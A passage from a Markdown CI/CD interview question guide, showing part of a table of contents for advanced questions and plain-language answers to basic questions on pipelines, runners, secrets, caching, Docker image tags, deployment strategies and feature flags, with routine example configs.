- [341: How do merge queues handle many PRs efficiently?](#341-how-do-merge-queues-handle-many-prs-efficiently)
- [342: How do you do trunk-based development safely at scale?](#342-how-do-you-do-trunk-based-development-safely-at-scale)
- [343: What is progressive delivery?](#343-what-is-progressive-delivery)
- [344: How does automated canary analysis work?](#344-how-does-automated-canary-analysis-work)
- [345: How does Argo Rollouts work?](#345-how-does-argo-rollouts-work)
- [346: How do you shift traffic precisely during a canary?](#346-how-do-you-shift-traffic-precisely-during-a-canary)
- [347: How can SLOs and error budgets be used as deployment gates?](#347-how-can-slos-and-error-budgets-be-used-as-deployment-gates)
- [348: How do you do a zero-downtime database migration, step by step?](#348-how-do-you-do-a-zero-downtime-database-migration-step-by-step)
- [349: How do you run large data backfills as part of a deployment?](#349-how-do-you-run-large-data-backfills-as-part-of-a-deployment)
- [350: How do you keep services compatible during a rolling deploy?](#350-how-do-you-keep-services-compatible-during-a-rolling-deploy)
- [351: What is different about deploying stateful services?](#351-what-is-different-about-deploying-stateful-services)
- [352: How do you evolve event or message schemas without breaking consumers?](#352-how-do-you-evolve-event-or-message-schemas-without-breaking-consumers)
- [353: What do you do when a release includes a migration that can't be reversed?](#353-what-do-you-do-when-a-release-includes-a-migration-that-cant-be-reversed)
- [354: How does "can-i-deploy" work in contract testing?](#354-how-does-can-i-deploy-work-in-contract-testing)
- [355: How do you manage the cost of ephemeral environments at scale?](#355-how-do-you-manage-the-cost-of-ephemeral-environments-at-scale)
- [356: What does "testing in production" mean, and is it a good idea?](#356-what-does-testing-in-production-mean-and-is-it-a-good-idea)
- [357: What is a dark launch?](#357-what-is-a-dark-launch)
- [358: What is shadow traffic (traffic mirroring)?](#358-what-is-shadow-traffic-traffic-mirroring)
- [359: How would you design a feature flag system?](#359-how-would-you-design-a-feature-flag-system)
- [360: What is a kill switch?](#360-what-is-a-kill-switch)
- [361: How do you deploy to multiple regions safely?](#361-how-do-you-deploy-to-multiple-regions-safely)
- [362: What are ring or wave deployments?](#362-what-are-ring-or-wave-deployments)
- [363: What is bake time?](#363-what-is-bake-time)
- [364: Are deployment freezes a good idea?](#364-are-deployment-freezes-a-good-idea)
- [365: How do you handle secrets in a GitOps setup?](#365-how-do-you-handle-secrets-in-a-gitops-setup)
- [366: How would you structure GitOps repositories?](#366-how-would-you-structure-gitops-repositories)
- [367: How do you promote changes between environments in GitOps?](#367-how-do-you-promote-changes-between-environments-in-gitops)
- [368: What are Argo CD sync waves and hooks?](#368-what-are-argo-cd-sync-waves-and-hooks)
- [369: What are the app-of-apps pattern and ApplicationSets in Argo CD?](#369-what-are-the-app-of-apps-pattern-and-applicationsets-in-argo-cd)
- [370: When would you choose Helm over Kustomize, or both?](#370-when-would-you-choose-helm-over-kustomize-or-both)
- [371: How do you make sure Terraform applies exactly what was reviewed?](#371-how-do-you-make-sure-terraform-applies-exactly-what-was-reviewed)
- [372: What is policy as code in CI/CD?](#372-what-is-policy-as-code-in-cicd)
- [373: How do you test infrastructure code?](#373-how-do-you-test-infrastructure-code)
- [374: How do you deploy across multiple cloud accounts?](#374-how-do-you-deploy-across-multiple-cloud-accounts)
- [375: What is immutable infrastructure?](#375-what-is-immutable-infrastructure)
- [376: Are there cases where rebuilding per environment is acceptable?](#376-are-there-cases-where-rebuilding-per-environment-is-acceptable)
- [377: What versioning schemes are common, and when do you use each?](#377-what-versioning-schemes-are-common-and-when-do-you-use-each)
- [378: Fixed or independent versioning in a monorepo?](#378-fixed-or-independent-versioning-in-a-monorepo)
- [379: What is a release train?](#379-what-is-a-release-train)
- [380: How do you automate backports to release branches?](#380-how-do-you-automate-backports-to-release-branches)
- [381: How do staged rollouts work for mobile apps?](#381-how-do-staged-rollouts-work-for-mobile-apps)
- [382: How do you handle CD for desktop or client-side apps that users install?](#382-how-do-you-handle-cd-for-desktop-or-client-side-apps-that-users-install)
- [383: How is CD for a library different from CD for a service?](#383-how-is-cd-for-a-library-different-from-cd-for-a-service)
- [384: How do you test database migrations realistically in CI?](#384-how-do-you-test-database-migrations-realistically-in-ci)
- [385: What does CI/CD look like for machine learning models?](#385-what-does-cicd-look-like-for-machine-learning-models)
- [386: How do you govern shared pipeline templates across an organization?](#386-how-do-you-govern-shared-pipeline-templates-across-an-organization)
- [387: What is platform engineering and how does it relate to CI/CD?](#387-what-is-platform-engineering-and-how-does-it-relate-to-cicd)
- [388: What are common mistakes when measuring DORA metrics?](#388-what-are-common-mistakes-when-measuring-dora-metrics)
- [389: How do you find the bottleneck in a delivery process?](#389-how-do-you-find-the-bottleneck-in-a-delivery-process)
- [390: The PR pipeline takes 45 minutes. How would you get it to 10?](#390-the-pr-pipeline-takes-45-minutes-how-would-you-get-it-to-10)
- [391: A deploy broke production on Friday at 5 PM. What do you do?](#391-a-deploy-broke-production-on-friday-at-5-pm-what-do-you-do)
- [392: You find that a secret was printed in public CI logs. What do you do?](#392-you-find-that-a-secret-was-printed-in-public-ci-logs-what-do-you-do)
- [393: Flaky E2E tests block merges several times a day. How do you fix this?](#393-flaky-e2e-tests-block-merges-several-times-a-day-how-do-you-fix-this)
- [394: Main is red several times a week. What would you change?](#394-main-is-red-several-times-a-week-what-would-you-change)
- [395: How would you migrate 200 repositories from Jenkins to GitHub Actions?](#395-how-would-you-migrate-200-repositories-from-jenkins-to-github-actions)
- [396: A third-party action you use was compromised. What do you do?](#396-a-third-party-action-you-use-was-compromised-what-do-you-do)
- [397: The deploy succeeded, but users see errors or the old version. What could be wrong?](#397-the-deploy-succeeded-but-users-see-errors-or-the-old-version-what-could-be-wrong)
- [398: How do you avoid broken frontend deployments caused by missing JavaScript chunks?](#398-how-do-you-avoid-broken-frontend-deployments-caused-by-missing-javascript-chunks)
- [399: What deployment problems do service workers cause?](#399-what-deployment-problems-do-service-workers-cause)
- [400: What is version skew between frontend and backend, and how do you handle it?](#400-what-is-version-skew-between-frontend-and-backend-and-how-do-you-handle-it)
- [401: Why should configuration changes go through a pipeline too?](#401-why-should-configuration-changes-go-through-a-pipeline-too)
- [402: How do you manage dependency updates across hundreds of repositories?](#402-how-do-you-manage-dependency-updates-across-hundreds-of-repositories)
- [403: When is it safe to auto-merge dependency updates?](#403-when-is-it-safe-to-auto-merge-dependency-updates)
- [404: Could you rebuild a release from two years ago? Why does it matter?](#404-could-you-rebuild-a-release-from-two-years-ago-why-does-it-matter)
- [405: How do retention requirements affect CI/CD in regulated companies?](#405-how-do-retention-requirements-affect-cicd-in-regulated-companies)
- [406: How do you trace a production change back to its ticket and code?](#406-how-do-you-trace-a-production-change-back-to-its-ticket-and-code)
- [407: How do you reconcile a Change Advisory Board with continuous delivery?](#407-how-do-you-reconcile-a-change-advisory-board-with-continuous-delivery)
- [408: What extra requirements does CI/CD have in regulated industries?](#408-what-extra-requirements-does-cicd-have-in-regulated-industries)
- [409: What happens if your CI system itself goes down?](#409-what-happens-if-your-ci-system-itself-goes-down)
- [410: What is a break-glass procedure?](#410-what-is-a-break-glass-procedure)
- [411: What problems do large Jenkins installations usually have?](#411-what-problems-do-large-jenkins-installations-usually-have)
- [412: What limits of GitHub Actions should you know about?](#412-what-limits-of-github-actions-should-you-know-about)
- [413: What pitfalls do GitLab's rules:changes have?](#413-what-pitfalls-do-gitlabs-ruleschanges-have)
- [414: How do you design fan-out and fan-in in a pipeline?](#414-how-do-you-design-fan-out-and-fan-in-in-a-pipeline)
- [415: What is remote build execution?](#415-what-is-remote-build-execution)
- [416: How would you cut CI costs for a large engineering org?](#416-how-would-you-cut-ci-costs-for-a-large-engineering-org)
- [417: How do you keep base images up to date?](#417-how-do-you-keep-base-images-up-to-date)
- [418: How do you handle the flood of vulnerability findings from scanners?](#418-how-do-you-handle-the-flood-of-vulnerability-findings-from-scanners)
- [419: How does npm trusted publishing improve package security?](#419-how-does-npm-trusted-publishing-improve-package-security)
- [420: How do you test risky infrastructure changes safely?](#420-how-do-you-test-risky-infrastructure-changes-safely)
- [421: How do you apply canary ideas to infrastructure and config changes?](#421-how-do-you-apply-canary-ideas-to-infrastructure-and-config-changes)
- [422: When would you use a database restore as a rollback, and what are the risks?](#422-when-would-you-use-a-database-restore-as-a-rollback-and-what-are-the-risks)
- [423: How does chaos engineering fit into CI/CD?](#423-how-does-chaos-engineering-fit-into-cicd)
- [424: How do you detect performance regressions in CI without too much noise?](#424-how-do-you-detect-performance-regressions-in-ci-without-too-much-noise)
- [425: How close to production should staging be, and is it worth it?](#425-how-close-to-production-should-staging-be-and-is-it-worth-it)
- [426: How do you handle personal data in test and staging environments?](#426-how-do-you-handle-personal-data-in-test-and-staging-environments)
- [427: How do you roll out changes in a multi-tenant SaaS product?](#427-how-do-you-roll-out-changes-in-a-multi-tenant-saas-product)
- [428: How do you do canary deployments for AWS Lambda?](#428-how-do-you-do-canary-deployments-for-aws-lambda)
- [429: Why should deploy scripts be idempotent?](#429-why-should-deploy-scripts-be-idempotent)
- [430: How can two pipelines deploy out of order, and how do you prevent it?](#430-how-can-two-pipelines-deploy-out-of-order-and-how-do-you-prevent-it)
- [431: How does database branching help preview environments?](#431-how-does-database-branching-help-preview-environments)
- [432: How do you combine a merge queue with affected-only builds in a monorepo?](#432-how-do-you-combine-a-merge-queue-with-affected-only-builds-in-a-monorepo)
- [433: What are common anti-patterns in pipelines?](#433-what-are-common-anti-patterns-in-pipelines)
- [434: What are the pros and cons of writing pipelines in a real programming language instead of YAML?](#434-what-are-the-pros-and-cons-of-writing-pipelines-in-a-real-programming-language-instead-of-yaml)
- [435: What is Dagger?](#435-what-is-dagger)
- [436: What is Spinnaker and when is it used?](#436-what-is-spinnaker-and-when-is-it-used)
- [437: How do you deploy Kubernetes CRDs and operators safely?](#437-how-do-you-deploy-kubernetes-crds-and-operators-safely)
- [438: How do you run database migrations as part of a Kubernetes deploy?](#438-how-do-you-run-database-migrations-as-part-of-a-kubernetes-deploy)
- [439: What are PodDisruptionBudgets and why do they matter for deployments?](#439-what-are-poddisruptionbudgets-and-why-do-they-matter-for-deployments)
- [440: How do you make sure no requests fail when old instances shut down?](#440-how-do-you-make-sure-no-requests-fail-when-old-instances-shut-down)
- [441: How do you deploy services that use WebSockets or other long-lived connections?](#441-how-do-you-deploy-services-that-use-websockets-or-other-long-lived-connections)
- [442: How do you deploy background workers without losing jobs?](#442-how-do-you-deploy-background-workers-without-losing-jobs)
- [443: What problems can scheduled tasks cause during deployments?](#443-what-problems-can-scheduled-tasks-cause-during-deployments)
- [444: Why can a new deployment be slow right after it starts, and how do you handle it?](#444-why-can-a-new-deployment-be-slow-right-after-it-starts-and-how-do-you-handle-it)
- [445: How do you measure whether a CI/CD improvement effort is working?](#445-how-do-you-measure-whether-a-cicd-improvement-effort-is-working)
- [446: How do you keep a pipeline fast as the codebase grows?](#446-how-do-you-keep-a-pipeline-fast-as-the-codebase-grows)
- [447: How do you decide what runs on a PR, in the merge queue, after merge, and nightly?](#447-how-do-you-decide-what-runs-on-a-pr-in-the-merge-queue-after-merge-and-nightly)
- [448: How would you explain the overall design principles of a good CI/CD system?](#448-how-would-you-explain-the-overall-design-principles-of-a-good-cicd-system)
- [449: How would you review a team's CI/CD setup when joining a new company?](#449-how-would-you-review-a-teams-cicd-setup-when-joining-a-new-company)
- [450: What do you think is the hardest part of CI/CD in practice?](#450-what-do-you-think-is-the-hardest-part-of-cicd-in-practice)

---

# Easy Questions (1-150)

## 1: What is CI/CD?

CI/CD stands for continuous integration and continuous delivery (or continuous deployment). It is a way of working where code changes are built, tested and released through an automated process instead of by hand.

CI is about merging code often and checking every change with automatic builds and tests. CD is about getting those checked changes to users in a repeatable way, with as few manual steps as possible.

## 2: What is continuous integration?

Continuous integration means developers merge their changes into the main branch often, at least once a day, and every merge triggers an automatic build and test run.

The goal is to find problems early. If ten people merge small changes every day, a broken change is easy to find. If they each work alone for a month and then merge, you get a lot of conflicts and bugs that are hard to track down.

## 3: What is continuous delivery?

Continuous delivery means every change that passes the pipeline is ready to be released to production at any time. The build, tests and deployment to test environments are automated, but the final push to production is a manual decision, often a button click.

The point is that releasing becomes a business decision, not a technical project. You can release any day without a long release process.

## 4: What is continuous deployment?

Continuous deployment goes one step further than continuous delivery. Every change that passes all the checks in the pipeline goes to production automatically, with no human approval.

This needs a lot of trust in your tests, monitoring and rollback process, because nobody looks at the change before users get it.

## 5: What is the difference between continuous delivery and continuous deployment?

Both automate the path to production. The difference is the last step:

| Continuous delivery                   | Continuous deployment                     |
| ------------------------------------- | ----------------------------------------- |
| Production deploy needs a manual step | Production deploy happens automatically   |
| Every change is releasable            | Every change that passes is released      |
| Common in teams with release planning | Common in teams with strong test coverage |

A team can start with continuous delivery and move to continuous deployment once they trust their pipeline.

## 6: What is a CI/CD pipeline?

A pipeline is the series of automated steps that a code change goes through, from commit to deployment. A typical pipeline installs dependencies, runs linters, runs tests, builds the app, and deploys it to one or more environments.

Pipelines are usually defined in a file in the repository, like `.github/workflows/ci.yml`, `.gitlab-ci.yml` or `Jenkinsfile`.

## 7: What is a stage in a pipeline?

A stage is a group of jobs that belong to the same phase of the pipeline, for example `build`, `test` and `deploy`. Stages usually run in order: if the `test` stage fails, the `deploy` stage does not start.

```yaml
# .gitlab-ci.yml
stages:
  - build
  - test
  - deploy
```

Jobs inside the same stage can run in parallel.

## 8: What is a job?

A job is one unit of work in a pipeline, like "run unit tests" or "build the Docker image". A job runs on a runner (a machine or container) and is made of one or more steps or commands.

In most tools, each job starts on a clean machine, so jobs do not share files unless you pass them through artifacts or a cache.

## 9: What is a step?

A step is a single command or action inside a job. Steps run one after another on the same machine, so they share the same files and environment.

```yaml
steps:
  - uses: actions/checkout@v6
  - run: npm ci
  - run: npm test
```

If a step fails, the following steps in that job are skipped by default.

## 10: What is a build?

A build is the process of turning source code into something that can run: compiling code, bundling JavaScript, creating a Docker image or packaging a JAR file. In CI, "the build" often also means the whole pipeline run for a commit, including tests.

## 11: What is a build artifact?

An artifact is a file or set of files produced by a pipeline that you want to keep or pass to a later job. Examples: a `dist/` folder, a `.jar` file, a Docker image, a test report or a coverage report.

Artifacts are stored by the CI system so other jobs, or people, can download them later.

## 12: What is a runner or agent?

A runner (GitHub Actions, GitLab) or agent (Jenkins, Azure Pipelines) is the machine that actually runs the jobs. It can be a virtual machine, a container or a physical server.

The CI server decides what to run, and the runner does the work. Runners can be hosted by the CI provider or run on your own machines.

## 13: What is a pipeline trigger?

A trigger is the event that starts a pipeline. Common triggers:

- A push to a branch
- Opening or updating a pull request
- Creating a tag
- A schedule (cron)
- A manual click
- A webhook from another system

```yaml
on:
  push:
    branches: [main]
  pull_request:
```

## 14: What are some popular CI/CD tools?

- **GitHub Actions**: built into GitHub
- **GitLab CI/CD**: built into GitLab
- **Jenkins**: open source, self-hosted, very flexible, lots of plugins
- **Azure Pipelines**: part of Azure DevOps
- **CircleCI**: hosted CI service
- **Bitbucket Pipelines**: built into Bitbucket
- **Argo CD** and **Flux**: GitOps tools for deploying to Kubernetes

Most teams use the CI tool that comes with their Git host, unless they have a reason not to.

## 15: Why do teams use CI/CD?

- Bugs are found earlier, when they are cheaper to fix
- Releases are smaller, so they are less risky
- Releases are repeatable, not dependent on one person's laptop
- Developers get fast feedback on their changes
- Less manual work and fewer human mistakes during deployment
- You can ship fixes to users in hours instead of weeks

## 16: What problem does continuous integration solve?

It solves "integration hell". When developers work on separate branches for weeks, merging all the work at the end causes big conflicts and bugs that come from changes interacting with each other.

With CI, changes are small and merged often, and each one is tested together with everyone else's code. Problems show up the same day, while the change is still fresh in the developer's mind.

## 17: What does "pipeline as code" mean?

It means the pipeline is described in a file stored in the same repository as the application code, instead of being configured by clicking in a web UI.

Benefits:

- Changes to the pipeline are reviewed in pull requests like any other code
- You have a history of who changed what
- Each branch can have its own version of the pipeline
- You can copy a working setup to another project

## 18: Why is YAML so common in CI/CD tools?

YAML is easy to read and write by hand, supports lists and nested objects, and allows comments. GitHub Actions, GitLab CI, Azure Pipelines, CircleCI and Kubernetes all use it.

The downside is that indentation matters and mistakes are easy to make, so it helps to use an editor with schema validation or a linter like `actionlint` for GitHub Actions.

## 19: What does a basic GitHub Actions workflow look like?

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: 22
      - run: npm ci
      - run: npm test
```

This runs on every push to `main` and on every pull request. It checks out the code, installs Node.js, installs dependencies and runs tests.

## 20: What does a basic GitLab CI pipeline look like?

```yaml
# .gitlab-ci.yml
stages:
  - test
  - build

default:
  image: node:22

test:
  stage: test
  script:
    - npm ci
    - npm test

build:
  stage: build
  script:
    - npm ci
    - npm run build
  artifacts:
    paths:
      - dist/
```

The `test` job runs first. If it passes, the `build` job runs and saves the `dist/` folder as an artifact.

## 21: What does a basic Jenkinsfile look like?

```groovy
pipeline {
  agent any

  stages {
    stage('Install') {
      steps {
        sh 'npm ci'
      }
    }
    stage('Test') {
      steps {
        sh 'npm test'
      }
    }
    stage('Build') {
      steps {
        sh 'npm run build'
      }
    }
  }
}
```

The `Jenkinsfile` lives in the root of the repo. Jenkins reads it and runs the stages in order.

## 22: What is a workflow in GitHub Actions?

A workflow is an automated process defined in a YAML file inside `.github/workflows/`. A repository can have many workflows, for example one for CI, one for deployment and one for releasing.

Each workflow has triggers (`on`), and one or more jobs. Jobs run in parallel by default unless you link them with `needs`.

## 23: What is an action in GitHub Actions?

An action is a reusable piece of code that does one task, used in a step with `uses`. For example `actions/checkout` checks out your repo and `actions/setup-node` installs Node.js.

```yaml
- uses: actions/setup-node@v6
  with:
    node-version: 22
```

Actions can be written in JavaScript, as a Docker container, or as a composite of other steps. You can find many of them in the GitHub Marketplace.

## 24: What is the .gitlab-ci.yml file?

It is the file in the root of a GitLab repository that defines the CI/CD pipeline. GitLab reads it on every push and creates a pipeline with the stages and jobs described in it.

You can split the config into several files and pull them in with `include`.

## 25: What is Jenkins?

Jenkins is an open source automation server, written in Java. It is one of the oldest and most used CI tools. You run it yourself on your own servers.

Its main strengths are flexibility and a large plugin ecosystem. Its main weaknesses are the maintenance work (updates, plugins, security) and an older UI. Many older companies still run their builds on Jenkins.

## 26: What is the difference between declarative and scripted Jenkins pipelines?

Both are written in a `Jenkinsfile` using Groovy.

- **Declarative** pipelines start with `pipeline { }` and follow a fixed structure (`agent`, `stages`, `steps`, `post`). They are easier to read and validate. This is the recommended style.
- **Scripted** pipelines start with `node { }` and are plain Groovy code. They are more flexible but harder to read and maintain. This is the older style.

```groovy
// Scripted (legacy style)
node {
  stage('Test') {
    sh 'npm test'
  }
}
```

## 27: How do you use environment variables in a pipeline?

You define them at the workflow, job or step level and read them like normal shell variables.

```yaml
env:
  NODE_ENV: test

jobs:
  test:
    runs-on: ubuntu-latest
    env:
      API_URL: http://localhost:3000
    steps:
      - run: echo "Running against $API_URL"
```

CI tools also provide built-in variables like the commit SHA, branch name and run number.

## 28: What are secrets in CI/CD?

Secrets are sensitive values like API keys, passwords and tokens that the pipeline needs but that must not be stored in the code. You add them in the CI tool's settings, and the tool injects them into the job at run time.

```yaml
- run: ./deploy.sh
  env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
```

The CI tool also hides secret values in the logs by replacing them with `***`.

## 29: Why should you never put secrets in the repository?

Anyone with access to the repo can read them, and they stay in the Git history forever, even if you delete them in a later commit. If the repo is ever made public or leaked, attackers can use them right away. Bots scan public repos for keys within minutes.

If a secret was committed by mistake, treat it as leaked: rotate it first, then clean up the history.

## 30: What is a broken build?

A broken build (or a "red" build) is a pipeline run that failed on the main branch, because of a compile error, a failing test, a lint error or a failed deployment.

A broken main branch blocks everyone, because new changes can't be checked against a working base.

## 31: What should you do when the build breaks?

Fixing it should be the top priority for the person who broke it. The usual options:

1. Fix it quickly if the cause is clear and the fix is small.
2. Revert the commit that broke it, then fix it calmly on a branch.

Do not merge more changes on top of a red build, because that makes it harder to find what went wrong. Many teams agree on a rule like "if it can't be fixed in 10 minutes, revert".

## 32: What does "keep the build green" mean?

It means the main branch should always pass the pipeline. The team treats a failing main branch as an urgent problem, not something to look at later.

When the build is always green, any commit on main can be deployed, and a new failure clearly points to the latest change.

## 33: Why run unit tests in the pipeline?

Unit tests are fast and check small pieces of code in isolation. Running them on every change catches logic errors right away. Because they are fast, they are usually one of the first things the pipeline runs.

Running them in CI also makes sure they run on a clean machine, not only on the developer's laptop where someone might forget to run them.

## 34: What are integration tests and where do they fit in a pipeline?

Integration tests check that several parts work together, for example your API code with a real database, or two services talking to each other. They are slower than unit tests and need more setup.

In a pipeline they usually run after unit tests, often with a database or other service started as a container in the job.

## 35: What are end-to-end tests?

End-to-end (E2E) tests check the whole application from the user's point of view, for example opening a browser, logging in and placing an order. Tools like Playwright and Cypress are common for web apps.

They give the most confidence but are the slowest and most likely to be flaky, so teams keep the number of E2E tests small and focused on the main user flows.

## 36: What is the test pyramid?

The test pyramid is a guideline for how many tests of each kind to have:

- **Many unit tests** at the bottom: fast and cheap
- **Fewer integration tests** in the middle
- **A small number of E2E tests** at the top: slow and expensive

In a pipeline this means you get most of your feedback quickly from unit tests, and only pay the cost of slow tests for the most important flows.

## 37: Why run linters in CI?

Linters like ESLint find common mistakes and enforce code style: unused variables, missing `await`, wrong hook usage and so on. Running them in CI makes sure every change follows the same rules, even if a developer has no linter set up in their editor.

```yaml
- run: npm run lint
```

Lint usually runs early, since it is fast and catches simple problems before the slower test jobs.

## 38: How do you check code formatting in CI?

You run the formatter in "check" mode, which fails if any file is not formatted, without changing files.

```bash
npx prettier --check .
```

This keeps formatting changes out of code reviews. Developers usually run the formatter locally or in a pre-commit hook, and CI is the final check.

## 39: What is static code analysis?

Static analysis looks at the source code without running it, to find bugs, security problems, code smells and complexity. Linters are one kind of static analysis. Others are type checkers (`tsc --noEmit`), and tools like SonarQube or CodeQL.

These run in the pipeline and can fail the build or add comments to pull requests.

## 40: What is code coverage?

Code coverage measures how much of your code runs during tests, usually as a percentage of lines, branches or functions. Many teams collect it in CI and show it in pull requests.

High coverage does not mean the tests are good, since a test can run code without checking the result. But very low coverage shows parts of the code that are not tested at all.

## 41: What is a pull request pipeline?

It is a pipeline that runs when someone opens or updates a pull request (or merge request in GitLab). It runs checks like lint, tests and build on the proposed change before it is merged.

The results show up on the pull request, and reviewers can see if the change is safe to merge. Pull request pipelines usually do not deploy to production.

## 42: What are required status checks?

Required status checks are pipeline jobs that must pass before a pull request can be merged. You set them in the branch protection rules (or rulesets) of the repository.

For example, you can say the `lint`, `test` and `build` jobs must be green before anyone can merge into `main`. This stops broken code from reaching the main branch.

## 43: What is branch protection?

Branch protection is a set of rules on important branches like `main`. Common rules:

- No direct pushes, changes only through pull requests
- Required status checks must pass
- At least one approving review
- No force pushes or deletion
- Branch must be up to date with `main` before merging

GitHub calls the newer version of this "rulesets". GitLab has "protected branches".

## 44: What is an environment in CI/CD?

An environment is a place where your application runs, such as `development`, `staging` or `production`. Each one usually has its own servers, database and configuration.

The pipeline deploys to environments in order, so a change is checked in a safe place before it reaches real users.

## 45: What is a staging environment?

Staging is an environment that is set up to look as much like production as possible. It is the last stop before production. Teams use it for final testing, demos and checking deployments.

The closer staging is to production (same OS, same versions, similar data), the more useful it is.

## 46: What is a deployment?

A deployment is the act of putting a new version of the application into an environment so it starts running there. It can mean copying files to a server, pushing a new Docker image to a cluster, or uploading a function to a serverless platform.

In CI/CD, deployments are done by the pipeline, not by a person running commands by hand.

## 47: What is the difference between a deployment and a release?

A **deployment** is a technical step: the new code is running in an environment. A **release** is when users actually get the new features.

They can be separate. With feature flags, you can deploy code to production with the new feature turned off, and release it later by turning the flag on. This makes deployments less risky.

## 48: What is a rollback?

A rollback means going back to the previous working version after a bad deployment. For example, redeploying the previous Docker image tag or switching traffic back to the old servers.

A good pipeline makes rollback fast and boring: one command or one click. It is much easier if you keep old build artifacts and the deployment process is automated.

## 49: What is semantic versioning?

Semantic versioning (SemVer) uses version numbers in the form `MAJOR.MINOR.PATCH`, like `2.4.1`.

- **MAJOR**: breaking changes
- **MINOR**: new features that are backward compatible
- **PATCH**: bug fixes

It is common for libraries and packages. Pipelines can bump the version automatically based on commit messages.

## 50: How are Git tags used in CI/CD?

A Git tag marks a specific commit, usually a release, like `v1.4.0`. Many pipelines use tags as a trigger for release jobs: building the final artifact, publishing a package or deploying to production.

```yaml
on:
  push:
    tags:
      - "v*"
```

Tags also make it easy to see which code is in which release.

## 51: What is a build number?

A build number is a number the CI system gives each pipeline run, usually counting up: run 1, run 2, run 3. It is often used in version strings or image tags so you can trace a deployed version back to the run that built it.

In GitHub Actions it is `github.run_number`, in GitLab `CI_PIPELINE_IID`, and in Jenkins `BUILD_NUMBER`.

## 52: What is the difference between npm install and npm ci?

`npm ci` is meant for CI:

- It installs exactly what is in `package-lock.json` and fails if the lock file doesn't match `package.json`.
- It deletes `node_modules` first, so you always get a clean install.
- It never changes `package.json` or the lock file.

`npm install` can update the lock file and resolve versions again, which can give different results on different machines. In CI you want the same result every time, so use `npm ci` (or `pnpm install --frozen-lockfile`, `yarn install --immutable`).

## 53: Why should you commit lock files?

Lock files (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `poetry.lock`, `Gemfile.lock`) record the exact version of every dependency, including dependencies of dependencies.

If you commit them, CI installs the same versions you tested locally. Without them, a new version of some package can be released overnight and break your build even though nobody changed any code.

## 54: What is caching in a pipeline?

Caching means saving files from one pipeline run and reusing them in later runs to save time. The most common case is dependency folders, like the npm cache or Maven's `.m2` folder, so they don't have to be downloaded again every time.

```yaml
- uses: actions/setup-node@v6
  with:
    node-version: 22
    cache: npm
```

A cache is an optimization. The pipeline should still work if the cache is empty.

## 55: What is the difference between a cache and an artifact?

| Cache                                  | Artifact                                 |
| -------------------------------------- | ---------------------------------------- |
| Used to speed up later runs            | Used to pass or keep the output of a run |
| Can be missing, the job still works    | Is needed, the job fails without it      |
| Example: `node_modules`, npm cache     | Example: `dist/`, test reports, binaries |
| Shared between runs and often branches | Belongs to one pipeline run              |

Rule of thumb: if a later job needs the file to do its work, use an artifact. If the file only makes things faster, use a cache.

## 56: How is Docker used in CI/CD?

Docker is used in two main ways:

1. **As the job environment**: the job runs inside a container image, like `node:22`, so every run has the same tools.
2. **As the build output**: the pipeline builds a Docker image of the app, pushes it to a registry, and the deployment runs that image.

Using the same image from CI all the way to production removes a lot of "works on my machine" problems.

## 57: What is a container registry?

A container registry stores Docker images so they can be pulled later by servers or clusters. Examples: Docker Hub, GitHub Container Registry (`ghcr.io`), GitLab Container Registry, Amazon ECR, Google Artifact Registry and Azure Container Registry.

The pipeline pushes the image after building it, and the deployment pulls it.

## 58: What is a Docker image tag?

A tag is a label for a specific version of an image, written after a colon: `myapp:1.4.0` or `myapp:3f2a1c9`. One image can have several tags.

In CI, common tags are the Git commit SHA, the version number and the branch name.

## 59: Why should you avoid the latest tag in deployments?

`latest` is just a normal tag that moves to whatever image was pushed last. If you deploy `myapp:latest`:

- You can't tell which version is actually running.
- Two servers can pull different images if a push happened in between.
- Rolling back is hard because the old `latest` is gone.

Deploy a fixed tag like the commit SHA or a version number instead.

## 60: What is infrastructure as code?

Infrastructure as code (IaC) means describing servers, networks, databases and other cloud resources in code files instead of creating them by hand in a console. Tools include Terraform, OpenTofu, Pulumi, AWS CloudFormation and AWS CDK.

The code lives in Git, is reviewed in pull requests, and is applied by a pipeline. This makes infrastructure repeatable and gives you a history of changes.

## 61: What is a deployment strategy?

A deployment strategy is the way you replace the old version of an app with the new one. The main ones are:

- **Recreate**: stop the old version, start the new one (has downtime)
- **Rolling**: replace instances a few at a time
- **Blue-green**: run the new version next to the old one, then switch traffic
- **Canary**: send a small part of traffic to the new version first

The choice depends on how much downtime and risk you can accept and how much infrastructure you can pay for.

## 62: What is a blue-green deployment?

You have two identical environments, blue and green. One serves live traffic (say blue). You deploy the new version to green, test it, and then switch the load balancer or DNS to send traffic to green.

If something goes wrong, you switch back to blue. The downside is that you need double the resources during the deploy, and database changes have to work with both versions.

## 63: What is a canary deployment?

In a canary deployment you release the new version to a small part of users first, like 5% of traffic. You watch error rates and latency. If everything looks fine, you increase the share step by step until it reaches 100%. If not, you send all traffic back to the old version.

The name comes from canaries that miners used to detect gas: a small group is exposed first.

## 64: What is a rolling deployment?

In a rolling deployment the instances of your app are updated a few at a time. For example, with 10 servers, you take 2 out, update them, put them back, then do the next 2.

There is no downtime and no need for double resources. The downside is that for a while, old and new versions run side by side, so they must be compatible with each other. This is the default strategy in Kubernetes Deployments.

## 65: What is a recreate deployment?

All old instances are stopped, then the new version is started. It is the simplest strategy and avoids running two versions at the same time, but users see downtime while the new version starts.

It can be fine for internal tools, dev environments, or apps that really can't run two versions at once.

## 66: What are feature flags?

Feature flags (or feature toggles) are switches in the code that turn a feature on or off without deploying again.

```js
if (flags.isEnabled("new-checkout", user)) {
  renderNewCheckout();
} else {
  renderOldCheckout();
}
```

They let you merge and deploy unfinished work safely, release a feature to some users first, and turn off a broken feature quickly. Tools include LaunchDarkly, Unleash, Flagsmith and GrowthBook, or you can build simple ones yourself.

## 67: What is trunk-based development?

In trunk-based development everyone works on short-lived branches (a day or two at most) or commits directly to the main branch ("trunk"). Unfinished features are hidden behind feature flags.

It fits well with CI because changes are small and merged often. The opposite is long-lived feature branches that are merged after weeks.

## 68: What is Git Flow and how does it compare to trunk-based development?

Git Flow uses several long-lived branches: `main` for releases, `develop` for integration, plus `feature/*`, `release/*` and `hotfix/*` branches.

It was popular for software with planned releases, but it makes CI harder because changes stay apart for a long time. Most web teams that deploy often now use trunk-based development or a simple flow with short feature branches merged into `main` (often called GitHub Flow).

## 69: How often should developers merge to the main branch?

At least once a day is the common advice for real continuous integration. Smaller, frequent merges mean fewer conflicts, easier reviews and faster feedback.

